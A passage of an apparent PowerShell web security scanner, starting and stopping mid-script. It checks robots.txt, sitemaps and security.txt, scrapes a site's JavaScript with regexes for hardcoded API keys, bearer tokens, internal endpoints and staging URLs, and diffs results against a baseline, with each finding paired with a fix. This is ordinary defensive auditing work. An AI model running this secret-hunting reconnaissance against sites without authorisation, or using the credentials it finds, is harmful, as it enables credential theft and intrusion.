                -suggestedFix "Remove sensitive paths from robots.txt or use authentication to protect them, not obscurity."
        }
    }
    
    # sitemap.xml
    $sitemapResult = Invoke-SafeWebRequest -uri ($site + "/sitemap.xml") -method "GET" -timeoutSec 5
    if ($sitemapResult.Success) {
        Write-Success "sitemap.xml found"
        
        # Check for admin/sensitive URLs in sitemap
        if ($sitemapResult.Content -match '(admin|backup|config|internal|test|staging)') {
            Write-Warning "sitemap.xml may expose sensitive URLs"
            Add-Issue -severity "Low" -title "Sensitive URLs in sitemap.xml" `
                -description "sitemap.xml includes paths that may be sensitive (admin/internal/test/staging)" `
                -remediation "Exclude sensitive areas from public sitemaps" `
                -whyItMatters "Search engines and attackers index sitemap.xml. Sensitive paths should not be advertised." `
                -suggestedFix "Generate sitemaps dynamically excluding authenticated/internal areas."
        }
    }
    
    # ========================================================================
    # ENHANCED SECURITY.TXT & BUG BOUNTY DETECTION
    # ========================================================================
    Write-Info "Checking for security.txt and vulnerability disclosure programs..."
    
    # Try multiple locations
    $securityTxtLocations = @(
        "/.well-known/security.txt",
        "/security.txt",
        "/security",
        "/responsible-disclosure",
        "/.well-known/security"
    )
    
    $securityPolicyFound = $false
    $securityContent = ""
    $foundLocation = ""
    
    foreach ($location in $securityTxtLocations) {
        $secResult = Invoke-SafeWebRequest -uri ($site + $location) -method "GET" -timeoutSec 5
        if ($secResult.Success -and $secResult.Content) {
            $securityPolicyFound = $true
            $securityContent = $secResult.Content
            $foundLocation = $location
            Write-Success "Security policy found at: $location"
            break
        }
    }
    
    if ($securityPolicyFound) {
        # Parse security.txt per RFC 9116
        $contactFound = $false
        $expiresFound = $false
        $bugBountyFound = $false
        $bugBountyPlatform = ""
        
        $lines = $securityContent -split "`n"
        foreach ($line in $lines) {
            $line = $line.Trim()
            
            # RFC 9116 fields
            if ($line -match '^Contact:') {
                $contactFound = $true
                Write-Success "  ✓ Contact field present"
            }
            if ($line -match '^Expires:') {
                $expiresFound = $true
                $expiresValue = $line -replace '^Expires:\s*', ''
                Write-Success "  ✓ Expires field present: $expiresValue"
                
                # Check if expired
                try {
                    $expiresDate = [DateTime]::Parse($expiresValue)
                    if ($expiresDate -lt (Get-Date)) {
                        Write-Warning "  ⚠ security.txt has EXPIRED (date: $expiresDate)"
                        Add-Issue -severity "Low" `
                            -title "Expired security.txt" `
                            -description "security.txt Expires field indicates policy expired on $expiresDate. Researchers may not trust outdated contact information." `
                            -url ($site + $foundLocation) `
                            -remediation "Update security.txt with current Expires date (recommend 1 year from now)" `
                            -issueType "ConfigurationIssue"
                    }
                } catch {
                    Write-Info "  Could not parse Expires date for validation"
                }
            }
            
            # Bug bounty platform detection
            if ($line -match 'hackerone\.com') {
                $bugBountyFound = $true
                $bugBountyPlatform = "HackerOne"
            }
            if ($line -match 'bugcrowd\.com') {
                $bugBountyFound = $true
                $bugBountyPlatform = "Bugcrowd"
            }
            if ($line -match 'intigriti\.com') {
                $bugBountyFound = $true
                $bugBountyPlatform = "Intigriti"
            }
            if ($line -match 'yeswehack\.com') {
                $bugBountyFound = $true
                $bugBountyPlatform = "YesWeHack"
            }
            if ($line -match 'synack\.com') {
                $bugBountyFound = $true
                $bugBountyPlatform = "Synack"
            }
        }
        
        if ($bugBountyFound) {
            Write-Success "  🎯 Bug bounty program detected: $bugBountyPlatform"
            Add-Issue -severity "Info" `
                -title "Bug Bounty Program Active" `
                -description "Organization operates a bug bounty program via $bugBountyPlatform. Responsible disclosure encouraged." `
                -url ($site + $foundLocation) `
                -issueType "SecurityFeature" `
                -evidence @{
                    Platform = $bugBountyPlatform
                    Location = $foundLocation
                }
        }
        
        # Validate RFC 9116 compliance
        if (-not $contactFound) {
            Write-Warning "  ⚠ Missing required 'Contact:' field (RFC 9116 violation)"
            Add-Issue -severity "Low" `
                -title "Invalid security.txt - Missing Contact Field" `
                -description "security.txt found but missing required 'Contact:' field per RFC 9116." `
                -url ($site + $foundLocation) `
                -remediation "Add 'Contact: mailto:security@example.com' or 'Contact: https://example.com/security'" `
                -issueType "ConfigurationIssue"
        }
        
        if (-not $expiresFound) {
            Write-Warning "  ⚠ Missing recommended 'Expires:' field (RFC 9116)"
            Add-Issue -severity "Info" `
                -title "security.txt Missing Expires Field" `
                -description "security.txt lacks 'Expires:' field. Researchers may not know if policy is current." `
                -url ($site + $foundLocation) `
                -remediation "Add 'Expires: YYYY-MM-DDTHH:MM:SSZ' (recommend 1 year ahead)" `
                -issueType "ConfigurationIssue"
        }
        
        # Success summary
        if ($contactFound -and $expiresFound) {
            Write-Success "security.txt appears RFC 9116 compliant"
            Add-Issue -severity "Info" `
                -title "Valid security.txt Detected" `
                -description "RFC 9116-compliant security.txt found with Contact and Expires fields. Good security practice." `
                -url ($site + $foundLocation) `
                -issueType "SecurityFeature"
        }
        
    } else {
        Write-Info "security.txt missing (consider adding)"
        Add-Issue -severity "Info" -title "No security.txt or Vulnerability Disclosure Policy" `
            -description "No vulnerability disclosure policy found at /.well-known/security.txt or /security. Security researchers lack clear contact information." `
            -remediation "Create /.well-known/security.txt per RFC 9116" `
            -whyItMatters "Without security.txt, researchers may not report vulnerabilities responsibly, leading to public disclosure or exploitation. Security.txt provides clear disclosure channels and demonstrates security maturity." `
            -suggestedFix "1. Create /.well-known/security.txt with: Contact (email/URL), Expires (1 year ahead), Preferred-Languages (en). 2. Optionally add Acknowledgments URL for hall of fame. 3. Consider bug bounty via HackerOne/Bugcrowd for incentivized reporting. Example:\n\nContact: mailto:security@example.com\nExpires: 2026-12-31T23:59:59Z\nPreferred-Languages: en\nPolicy: https://example.com/security-policy" `
            -issueType "MissingBestPractice"
    }
    
    # Check homepage source for leakage
    # Try to use baseline response first
    $homeResult = $null
    if ($script:baselineResponse.Success -and $script:baselineResponse.Content) {
        Write-Info "Using cached baseline response for information disclosure analysis"
        $homeResult = $script:baselineResponse
    }
    else {
        Write-Info "Baseline not available - fetching homepage directly"
        $homeResult = Invoke-SafeWebRequest -uri $site -method "GET"
    }
    
    if ($homeResult.Success) {
        $content = $homeResult.Content
        $contentLower = $content.ToLower()
        
        # Emails (capture actual addresses)
        $emailMatches = [regex]::Matches($content, '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
        if ($emailMatches.Count -gt 0) {
            $uniqueEmails = $emailMatches | Select-Object -ExpandProperty Value | Sort-Object -Unique
            Write-Warning "Email addresses found in HTML: $($uniqueEmails.Count) unique"
            Add-Issue -severity "Low" -title "Email Address Disclosure" `
                -description "Email addresses exposed in HTML source: $($uniqueEmails -join ', ')" `
                -remediation "Use contact forms instead of exposing emails directly" `
                -whyItMatters "Exposed emails are harvested by spambots and targeted in phishing campaigns." `
                -suggestedFix "Replace email links with obfuscated JavaScript or server-side contact forms."
        }
        
        # Secrets / tokens (capture context)
        $tokenMatches = [regex]::Matches($contentLower, '(api[_-]?key|apikey|access[_-]?token|secret|password)\s*[:=]\s*[''"]?([a-zA-Z0-9_\-]{16,})')
        if ($tokenMatches.Count -gt 0) {
            Write-Warning "API key/token patterns detected in source ($($tokenMatches.Count) matches)"
            $evidence = ($tokenMatches | Select-Object -First 3 | ForEach-Object { $_.Groups[1].Value }) -join ', '
            Add-Issue -severity "High" -title "Potential Credential Exposure" `
                -description "API key or token-like strings found in page source: $evidence..." `
                -remediation "Never expose credentials in client-side code" `
                -whyItMatters "Hardcoded credentials in HTML/JS are visible to anyone. Attackers extract these tokens and abuse your APIs/services." `
                -suggestedFix "Move all secrets to server-side environment variables. Use secure token exchange flows (OAuth, JWT)."
        } elseif ($contentLower -match 'api[_-]?key|apikey|access[_-]?token|secret') {
            Write-Warning "API key/token keywords detected (no clear values)"
            Add-Issue -severity "Medium" -title "Potential Credential Keywords" `
                -description "Keywords like 'apikey', 'access_token', 'secret' found in source code" `
                -remediation "Review source for hardcoded credentials" `
                -whyItMatters "Even without clear values, these patterns suggest credential management in client-side code." `
                -suggestedFix "Audit all JavaScript/HTML for hardcoded secrets. Use environment variables server-side."
        }
        
        # Internal IPs (capture specific IPs)
        $ipMatches = [regex]::Matches($content, '\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b')
        if ($ipMatches.Count -gt 0) {
            $uniqueIPs = $ipMatches | Select-Object -ExpandProperty Value | Sort-Object -Unique
            Write-Warning "Internal IP addresses found: $($uniqueIPs -join ', ')"
            Add-Issue -severity "Low" -title "Internal IP Disclosure" `
                -description "Private IP addresses exposed in HTML source: $($uniqueIPs -join ', ')" `
                -remediation "Remove internal IP references from public pages" `
                -whyItMatters "Internal IPs reveal network topology and may help attackers map your infrastructure." `
                -suggestedFix "Use public DNS names or load balancer IPs. Never reference RFC 1918 addresses in public HTML."
        }
        
        # Version info in HTML comments (capture actual versions)
        $versionMatches = [regex]::Matches($content, '<!--.*?(v?\d+\.\d+[.\d]*).*?-->')
        if ($versionMatches.Count -gt 0) {
            $versions = $versionMatches | Select-Object -ExpandProperty Value | Select-Object -First 3
            Write-Warning "Version information in HTML comments ($($versionMatches.Count) matches)"
            Add-Issue -severity "Low" -title "Version Disclosure in Comments" `
                -description "Software version information found in comments: $($versions -join '; ')" `
                -remediation "Remove version info from production HTML" `
                -whyItMatters "Version numbers help attackers identify vulnerable software versions and target known exploits." `
                -suggestedFix "Strip HTML comments in production builds. Use build process to remove debug info."
        }
        
        # Stack traces or error messages
        if ($contentLower -match '(exception|stack trace|error|warning|debug|mysqli_|pg_query|odbc_|sqlsrv_)') {
            Write-Warning "Possible debug/error information in HTML"
            Add-Issue -severity "Medium" -title "Debug Information Disclosure" `
                -description "HTML source contains debug/error keywords that may expose stack traces or DB details" `
                -remediation "Disable debug mode in production" `
                -whyItMatters "Stack traces reveal code paths, file structures, and framework versions - valuable recon for attackers." `
                -suggestedFix "Set production error handling to log server-side only. Return generic error pages to users."
        }
        
        # Framework/CMS detection in comments
        if ($content -match '<!--.*?(WordPress|Drupal|Joomla|Laravel|Django|Rails|Flask|ASP\.NET|Spring).*?-->') {
            $framework = $matches[1]
            Write-Info "Framework/CMS detected in comments: $framework"
        }
    }
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 15B: DEEP JS ASSET SCRAPING & SECRET SCANNING
# ============================================================================
function Test-JSAssetScraping {
    Start-SecurityTest "JavaScript Asset Scraping & Secret Hunting" "15B"
    
    Write-Info "Parsing JavaScript assets for hardcoded secrets and internal endpoints..."
    
    # Try to use baseline response first
    $mainPage = $null
    if ($script:baselineResponse.Success -and $script:baselineResponse.Content) {
        Write-Info "Using cached baseline response for JS asset extraction"
        $mainPage = $script:baselineResponse
    }
    else {
        Write-Info "Baseline not available - fetching homepage directly"
        $mainPage = Invoke-SafeWebRequest -uri $site -method "GET"
    }
    
    if (-not $mainPage.Success -or -not $mainPage.Content) {
        Write-Warning "Could not retrieve main page for JS asset scraping"
        Write-Info "Possible causes: WAF block, rate limiting, or network timeout"
        
        Add-Issue -severity "Info" `
            -title "JS Asset Scraping Inconclusive" `
            -description "Unable to retrieve homepage HTML to extract JavaScript file references. Cannot scan for hardcoded secrets." `
            -remediation "Manual review required. Use browser DevTools to inspect JS files for API keys, tokens, internal endpoints." `
            -category "Configuration" `
            -issueType "VerificationFailed" `
            -confidence "Low"
        
        Complete-SecurityTest
        return
    }
    
    $html = $mainPage.Content
    
    # Extract all <script src="..."> tags
    $scriptPattern = '<script[^>]*src\s*=\s*["\'']([\w\s\-\./_:?&=]+)["\'']\s*'
    $scriptMatches = [regex]::Matches($html, $scriptPattern)
    
    $jsFiles = @()
    foreach ($match in $scriptMatches) {
        $scriptSrc = $match.Groups[1].Value
        
        # Convert relative URLs to absolute
        if ($scriptSrc -match '^//' ) {
            $scriptSrc = "https:" + $scriptSrc
        }
        elseif ($scriptSrc -match '^/') {
            $uri = [System.Uri]$site
            $scriptSrc = $uri.Scheme + "://" + $uri.Host + $scriptSrc
        }
        elseif ($scriptSrc -notmatch '^https?://') {
            # Relative path
            $scriptSrc = $site.TrimEnd('/') + '/' + $scriptSrc.TrimStart('./')
        }
        
        # Skip external CDN scripts (too noisy)
        if ($scriptSrc -notmatch 'googleapis|cloudflare|jquery|bootstrap|cdnjs|unpkg|jsdelivr') {
            $jsFiles += $scriptSrc
        }
    }
    
    Write-Info "Found $($jsFiles.Count) local JavaScript file(s) to analyze"
    
    if ($jsFiles.Count -eq 0) {
        Write-Info "No local JavaScript assets found to scan"
        Complete-SecurityTest
        return
    }
    
    $apiKeysFound = @()
    $internalEndpointsFound = @()
    $stagingUrlsFound = @()
    $emailsFound = @()
    $tokensFound = @()
    $scannedFiles = 0
    $maxFilesToScan = 15  # Limit to avoid excessive requests
    
    foreach ($jsUrl in ($jsFiles | Select-Object -First $maxFilesToScan)) {
        $scannedFiles++
        Write-Info "[$scannedFiles/$([Math]::Min($jsFiles.Count, $maxFilesToScan))] Scanning: $jsUrl"
        
        $jsResult = Invoke-SafeWebRequest -uri $jsUrl -method "GET" -timeoutSec 10
        
        if (-not $jsResult.Success) {
            Write-Debug "Could not download: $jsUrl"
            continue
        }
        
        $jsContent = $jsResult.Content
        $jsContentLower = $jsContent.ToLower()
        
        # ========== SCAN FOR API KEYS / TOKENS ==========
        $apiKeyPatterns = @(
            'api[_-]?key\s*[:=]\s*["'']([a-zA-Z0-9_\-]{20,})["'']',
            'apikey\s*[:=]\s*["'']([a-zA-Z0-9_\-]{20,})["'']',
            'x-api-key\s*[:=]\s*["'']([a-zA-Z0-9_\-]{20,})["'']',
            'access[_-]?token\s*[:=]\s*["'']([a-zA-Z0-9_\-\.]{20,})["'']',
            'bearer\s+([a-zA-Z0-9_\-\.]{20,})',
            'authorization\s*[:=]\s*["'']bearer\s+([a-zA-Z0-9_\-\.]{20,})["'']'
        )
        
        foreach ($pattern in $apiKeyPatterns) {
            $keyMatches = [regex]::Matches($jsContent, $pattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
            foreach ($keyMatch in $keyMatches) {
                if ($keyMatch.Groups.Count -ge 2) {
                    $keyValue = $keyMatch.Groups[1].Value
                    
                    # Skip obvious placeholders
                    if ($keyValue -notmatch 'your|example|test|demo|placeholder|xxx|yyy|zzz|123') {
                        $apiKeysFound += @{
                            File = $jsUrl
                            Key = $keyValue.Substring(0, [Math]::Min(40, $keyValue.Length))
                            Pattern = $keyMatch.Groups[0].Value.Substring(0, [Math]::Min(60, $keyMatch.Groups[0].Value.Length))
                        }
                    }
                }
            }
        }
        
        # ========== SCAN FOR INTERNAL ENDPOINTS ==========
        $internalEndpointPatterns = @(
            '/internal/', '/admin/api/', '/api/internal/', '/api/admin/',
            '/private/', '/dev/', '/debug/', '/test/', '/staging/'
        )
        
        foreach ($endpoint in $internalEndpointPatterns) {
            if ($jsContentLower -match [regex]::Escape($endpoint)) {
                # Extract full URL context
                $contextPattern = '["'']([^"'']*' + [regex]::Escape($endpoint) + '[^"'']*)["'']'
                $contextMatch = [regex]::Match($jsContent, $contextPattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
                
                if ($contextMatch.Success) {
                    $fullEndpoint = $contextMatch.Groups[1].Value
                    $internalEndpointsFound += @{
                        File = $jsUrl
                        Endpoint = $fullEndpoint
                    }
                }
            }
        }
        
        # ========== SCAN FOR STAGING/DEV URLS ==========
        $stagingPatterns = @(
            'https?://[a-z0-9\-]*(staging|dev|development|test|qa|beta|alpha|internal)[a-z0-9\-]*\.[a-z0-9\-\.]+',
            'https?://(staging|dev|test|qa|beta)\.[a-z0-9\-\.]+',
            '//[a-z0-9\-]*(staging|dev|test)[a-z0-9\-]*\.[a-z0-9\-\.]+'
        )
        
        foreach ($pattern in $stagingPatterns) {
            $stagingMatches = [regex]::Matches($jsContent, $pattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
            foreach ($stagingMatch in $stagingMatches) {
                $stagingUrl = $stagingMatch.Value
                if ($stagingUrl -notin $stagingUrlsFound.Url) {
                    $stagingUrlsFound += @{
                        File = $jsUrl
                        Url = $stagingUrl
                    }
                }
            }
        }
        
        # ========== SCAN FOR EMAIL ADDRESSES ==========
        $emailMatches = [regex]::Matches($jsContent, '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
        foreach ($emailMatch in $emailMatches) {
            $email = $emailMatch.Value
            if ($email -notin $emailsFound.Email) {
                $emailsFound += @{
                    File = $jsUrl
                    Email = $email
                }
            }
        }
        
        # ========== SCAN FOR LONG BASE64-ISH STRINGS (TOKENS) ==========
        $longStringPattern = '["'']([a-zA-Z0-9_\-\.]{50,})["'']'
        if ($jsContent -match $longStringPattern) {
            $longStringMatches = [regex]::Matches($jsContent, $longStringPattern)
            foreach ($longMatch in ($longStringMatches | Select-Object -First 3)) {
                $tokenValue = $longMatch.Groups[1].Value
                # Skip URLs
                if ($tokenValue -notmatch '^https?://' -and $tokenValue -notmatch '^www\.') {
                    $tokensFound += @{
                        File = $jsUrl
                        Token = $tokenValue.Substring(0, [Math]::Min(60, $tokenValue.Length)) + "..."
                    }
                }
            }
        }
    }
    
    # ========== REPORT FINDINGS ==========
    Write-Host ""
    Write-Info "JS Asset Scanning Summary:"
    Write-Info "  Files scanned: $scannedFiles"
    Write-Info "  API keys/tokens: $($apiKeysFound.Count)"
    Write-Info "  Internal endpoints: $($internalEndpointsFound.Count)"
    Write-Info "  Staging URLs: $($stagingUrlsFound.Count)"
    Write-Info "  Email addresses: $($emailsFound.Count)"
    Write-Info "  Long token strings: $($tokensFound.Count)"
    
    # API Keys
    if ($apiKeysFound.Count -gt 0) {
        Write-Danger "API keys/tokens found in JavaScript!"
        foreach ($apiKey in ($apiKeysFound | Select-Object -First 5)) {
            Write-Warning "  $($apiKey.Pattern) in $([System.IO.Path]::GetFileName($apiKey.File))"
            
            Add-Issue -severity "High" `
                -title "Exposed API Key in Client-Side JavaScript" `
                -description "API key or token found in JS file: $($apiKey.Key)... (truncated). Pattern: $($apiKey.Pattern)" `
                -url $apiKey.File `
                -remediation "Never expose API keys in client-side code. Move secrets to server-side environment variables." `
                -whyItMatters "Hardcoded API keys in JavaScript are visible to anyone. Attackers extract these tokens from browser DevTools or downloaded JS files and abuse your APIs, potentially incurring costs or accessing sensitive data." `
                -suggestedFix "Use backend proxy pattern: frontend calls your server, server calls external API with secret key. Or use restricted API keys with domain whitelisting and rate limits." `
                -issueType "SensitiveDataExposure" `
                -confidence "High"
        }
    }
    
    # Internal Endpoints
    if ($internalEndpointsFound.Count -gt 0) {
        Write-Warning "Internal API endpoints leaked in JavaScript"
        foreach ($endpoint in ($internalEndpointsFound | Select-Object -First 5)) {
            Write-Warning "  $($endpoint.Endpoint) in $([System.IO.Path]::GetFileName($endpoint.File))"
            
            Add-Issue -severity "Medium" `
                -title "Internal API Endpoint Leaked in JavaScript" `
                -description "Internal endpoint path found in JS: $($endpoint.Endpoint)" `
                -url $endpoint.File `
                -remediation "Remove references to internal/admin/debug endpoints from production JS" `
                -whyItMatters "Leaked internal endpoints give attackers a roadmap to sensitive APIs. Paths like /admin/api/ or /internal/ should not be discoverable in public JavaScript files." `
                -suggestedFix "Use environment-specific builds that exclude internal endpoints. Implement proper access controls on internal APIs (don't rely on obscurity)." `
                -issueType "InfoDisclosure" `
                -confidence "Medium"
        }
    }
    
    # Staging URLs
    if ($stagingUrlsFound.Count -gt 0) {
        Write-Warning "Staging/development URLs found in JavaScript"
        foreach ($staging in ($stagingUrlsFound | Select-Object -First 5)) {
            Write-Warning "  $($staging.Url) in $([System.IO.Path]::GetFileName($staging.File))"
            
            Add-Issue -severity "Medium" `
                -title "Staging/Development URL in Production JavaScript" `
                -description "Non-production URL found: $($staging.Url)" `
                -url $staging.File `
                -remediation "Remove staging/dev URLs from production builds" `
                -whyItMatters "Staging URLs often have weaker security, debug modes enabled, or test data. Attackers target these environments to find vulnerabilities before attacking production." `
                -suggestedFix "Use environment variables for API base URLs. Build process should inject production URLs only. Never hardcode staging/dev URLs in production code." `
                -issueType "InfoDisclosure" `
                -confidence "High"
        }
    }
    
    # Emails
    if ($emailsFound.Count -gt 0) {
        Write-Info "Email addresses found in JavaScript ($($emailsFound.Count) total)"
        foreach ($email in ($emailsFound | Select-Object -First 3)) {
            Write-Info "  $($email.Email)"
        }
        
        Add-Issue -severity "Low" `
            -title "Email Addresses in JavaScript Files" `
            -description "Developer emails found in JS: $($emailsFound.Email -join ', ')" `
            -remediation "Remove developer emails from production code" `
            -whyItMatters "Emails in code are harvested for spam and phishing campaigns." `
            -suggestedFix "Use generic support emails or contact forms instead of personal addresses." `
            -issueType "InfoDisclosure" `
            -confidence "Medium"
    }
    
    # Long Tokens
    if ($tokensFound.Count -gt 0) {
        Write-Warning "Long token-like strings found ($($tokensFound.Count) total)"
        Add-Issue -severity "Low" `
            -title "Potential Tokens in JavaScript" `
            -description "Long Base64-like strings found that may be tokens: $($tokensFound.Count) instances" `
            -remediation "Review JS files for hardcoded secrets" `
            -whyItMatters "Long alphanumeric strings may be JWT tokens, session IDs, or other secrets." `
            -suggestedFix "Audit all long strings in JS. Move any secrets to server-side secure storage." `
            -issueType "SensitiveDataExposure" `
            -confidence "Low"
    }
    
    if ($apiKeysFound.Count -eq 0 -and $internalEndpointsFound.Count -eq 0 -and $stagingUrlsFound.Count -eq 0) {
        Write-Success "No obvious secrets or internal endpoints found in JavaScript assets"
    }
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 16: BASELINE COMPARISON & REGRESSION TRACKING
# ============================================================================
function Test-BaselineDiff {
    <#
    .SYNOPSIS
    Compares current scan results against a baseline report to identify new/resolved issues
    #>
    
    param(
        [string]$baselinePath = $BaselineReport
    )
    
    if ([string]::IsNullOrWhiteSpace($baselinePath) -or -not (Test-Path $baselinePath)) {
        Write-Info "No baseline report provided or file not found - skipping regression analysis"
        return @{
            Name = "BaselineDiff"
            Status = "Skipped"
            HasBaseline = $false
        }
    }
    
    Start-SecurityTest "Baseline Comparison & Regression Analysis" "16"
    
    $result = @{
        Name = "BaselineDiff"
        Status = "Completed"
        Duration = 0
        HasBaseline = $true
        NewFindings = @()
        ResolvedFindings = @()
        SeverityChanges = @()
        Metrics = @{
            BaselineIssueCount = 0
            CurrentIssueCount = 0
            NewIssues = 0
            ResolvedIssues = 0
            SeverityIncreases = 0
            SeverityDecreases = 0
        }
    }
    
    try {
        Write-Info "Loading baseline report from: $baselinePath"
        
        # Load baseline JSON
        $baselineData = Get-Content -Path $baselinePath -Raw | ConvertFrom-Json
        
        if (-not $baselineData.Issues) {
            Write-Warning "Baseline report doesn't contain Issues section"
            $result.Status = "Failed"
            Complete-SecurityTest "Failed"
            return $result
        }
        
        # Flatten baseline issues into a single list with unique keys
        $baselineIssues = @{}
        foreach ($severity in @('Critical', 'High', 'Medium', 'Low', 'Info')) {
            if ($baselineData.Issues.$severity) {
                foreach ($issue in $baselineData.Issues.$severity) {
                    # Create unique key based on title + URL
                    $key = "$($issue.Title)|$($issue.URL)"
                    $baselineIssues[$key] = @{
                        Severity = $severity
                        Title = $issue.Title
                        Description = $issue.Description
                        URL = $issue.URL
                        CWE = $issue.CWE
                        OWASPCategory = $issue.OWASPCategory
                    }
                }
            }
        }
        
        $result.Metrics.BaselineIssueCount = $baselineIssues.Count
        Write-Info "Baseline contained $($baselineIssues.Count) issues"
        
        # Flatten current issues
        $currentIssues = @{}
        foreach ($severity in @('Critical', 'High', 'Medium', 'Low', 'Info')) {
            foreach ($issue in $script:issues[$severity]) {
                $key = "$($issue.Title)|$($issue.URL)"
                $currentIssues[$key] = @{
                    Severity = $severity
                    Title = $issue.Title
                    Description = $issue.Description
                    URL = $issue.URL
                    CWE = $issue.CWE
                    OWASPCategory = $issue.OWASPCategory
                }
            }
        }
        
        $result.Metrics.CurrentIssueCount = $currentIssues.Count
        Write-Info "Current scan found $($currentIssues.Count) issues"
        
        # ========== FIND NEW ISSUES ==========
        Write-Info "Phase 1: Identifying NEW issues introduced since baseline..."
        
        foreach ($key in $currentIssues.Keys) {
            if (-not $baselineIssues.ContainsKey($key)) {
                $newIssue = $currentIssues[$key]
                $result.NewFindings += $newIssue
                $result.Metrics.NewIssues++
                
                Write-Danger "🆕 NEW: [$($newIssue.Severity)] $($newIssue.Title)"
                
                Add-Issue -severity $newIssue.Severity `
                    -title "🆕 REGRESSION: $($newIssue.Title)" `
                    -description "NEW ISSUE (not in baseline): $($newIssue.Description)" `
                    -remediation "This issue was introduced since the last baseline scan" `
                    -url $newIssue.URL `
                    -cweId $newIssue.CWE `
                    -owaspCategory $newIssue.OWASPCategory `
                    -confidence "High"
            }
        }
        
        # ========== FIND RESOLVED ISSUES ==========
        Write-Info "Phase 2: Identifying RESOLVED issues (fixed since baseline)..."
        
        foreach ($key in $baselineIssues.Keys) {
            if (-not $currentIssues.ContainsKey($key)) {
                $resolvedIssue = $baselineIssues[$key]
                $result.ResolvedFindings += $resolvedIssue
                $result.Metrics.ResolvedIssues++
                
                $resolvedMsg = "[RESOLVED] [" + $resolvedIssue.Severity + "] " + $resolvedIssue.Title
                Write-Success $resolvedMsg
                
                Add-Issue -severity "Info" `
                    -title "✅ FIXED: $($resolvedIssue.Title)" `
                    -description "This issue from baseline has been RESOLVED: $($resolvedIssue.Description)" `
                    -remediation "N/A - Issue has been fixed" `
                    -url $resolvedIssue.URL `
                    -confidence "High"
            }
        }
        
        # ========== FIND SEVERITY CHANGES ==========
        Write-Info "Phase 3: Detecting severity changes..."
        
        $severityOrder = @{
            'Critical' = 5
            'High' = 4
            'Medium' = 3
            'Low' = 2
            'Info' = 1
        }
        
        foreach ($key in $currentIssues.Keys) {
            if ($baselineIssues.ContainsKey($key)) {
                $currentSeverity = $currentIssues[$key].Severity
                $baselineSeverity = $baselineIssues[$key].Severity
                
                if ($currentSeverity -ne $baselineSeverity) {
                    $change = @{
                        Title = $currentIssues[$key].Title
                        URL = $currentIssues[$key].URL
                        OldSeverity = $baselineSeverity
                        NewSeverity = $currentSeverity
                        Direction = if ($severityOrder[$currentSeverity] -gt $severityOrder[$baselineSeverity]) { "Increased" } else { "Decreased" }
                    }
                    
                    $result.SeverityChanges += $change
                    
                    if ($change.Direction -eq "Increased") {
                        $result.Metrics.SeverityIncreases++
                        $increaseMsg = "[SEVERITY INCREASE] " + $change.Title + " - " + $baselineSeverity + " to " + $currentSeverity
                        Write-Warning $increaseMsg
                        
                        $issueTitle = "[WARNING] Severity Increased: " + $change.Title
                        Add-Issue -severity "High" `
                            -title $issueTitle `
                            -description "Issue severity increased from $baselineSeverity to $currentSeverity since baseline" `
                            -remediation "Review why this issue has become more severe" `
                            -url $change.URL `
                            -confidence "High"
                    }
                    else {
                        $result.Metrics.SeverityDecreases++
                        $decreaseMsg = "[Severity Decreased] " + $change.Title + " - " + $baselineSeverity + " to " + $currentSeverity
                        Write-Success $decreaseMsg
                    }
                }
            }
        }
        
        # ========== SUMMARY ==========
        Write-Host ""
        Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor Cyan
        Write-Host "  BASELINE COMPARISON SUMMARY" -ForegroundColor Cyan
        Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor Cyan
        Write-Host "Baseline File: $baselinePath" -ForegroundColor White
        Write-Host ""
        Write-Host "Issue Counts:" -ForegroundColor Yellow
        Write-Host "  Baseline:  $($result.Metrics.BaselineIssueCount) issues" -ForegroundColor White
        Write-Host "  Current:   $($result.Metrics.CurrentIssueCount) issues" -ForegroundColor White
        Write-Host ""
        Write-Host "Changes:" -ForegroundColor Yellow
        Write-Host "  🆕 New Issues:           $($result.Metrics.NewIssues)" -ForegroundColor $(if ($result.Metrics.NewIssues -gt 0) { "Red" } else { "Green" })
        Write-Host "  ✅ Resolved Issues:      $($result.Metrics.ResolvedIssues)" -ForegroundColor $(if ($result.Metrics.ResolvedIssues -gt 0) { "Green" } else { "White" })
        Write-Host "  ⬆️ Severity Increases:   $($result.Metrics.SeverityIncreases)" -ForegroundColor $(if ($result.Metrics.SeverityIncreases -gt 0) { "Yellow" } else { "White" })
        Write-Host "  ⬇️ Severity Decreases:   $($result.Metrics.SeverityDecreases)" -ForegroundColor $(if ($result.Metrics.SeverityDecreases -gt 0) { "Green" } else { "White" })
        Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor Cyan
        Write-Host ""
        
        # Overall assessment
        if ($result.Metrics.NewIssues -eq 0 -and $result.Metrics.SeverityIncreases -eq 0) {
            Write-Success "[NO REGRESSIONS] Security posture maintained or improved!"
        }
        elseif ($result.Metrics.NewIssues -gt 0 -or $result.Metrics.SeverityIncreases -gt 0) {
            Write-Danger "[REGRESSIONS DETECTED] Security posture has degraded!"
            $newIssuesMsg = "  - " + $result.Metrics.NewIssues + " new issue(s) introduced"
            Write-Warning $newIssuesMsg
            $sevIncMsg = "  - " + $result.Metrics.SeverityIncreases + " severity increase(s)"
            Write-Warning $sevIncMsg
        }
        
        if ($result.Metrics.ResolvedIssues -gt 0) {
            Write-Success "👏 $($result.Metrics.ResolvedIssues) issue(s) have been fixed since baseline"
        }
        
        $result.Status = "Completed"
        Complete-SecurityTest
    }
    catch {
        Write-Danger "Baseline comparison failed: $_"
        Write-Log "Test 16 failed: $_" "ERROR"
        $result.Status = "Failed"
        Complete-SecurityTest "Failed"
    }
    
    return $result
}

# ============================================================================
# TEST 17: SUBDOMAIN ENUMERATION
# ============================================================================
function Test-SubdomainEnum {
    Start-SecurityTest "Subdomain Enumeration" "17"
    
    $result = @{
        Name = "SubdomainEnum"
        Status = "Completed"
        Duration = 0
        Issues = @()
        Evidence = @{}
        Metrics = @{
            SubdomainsFound = 0
            ExposedSubdomains = @()
        }
    }
    
    try {
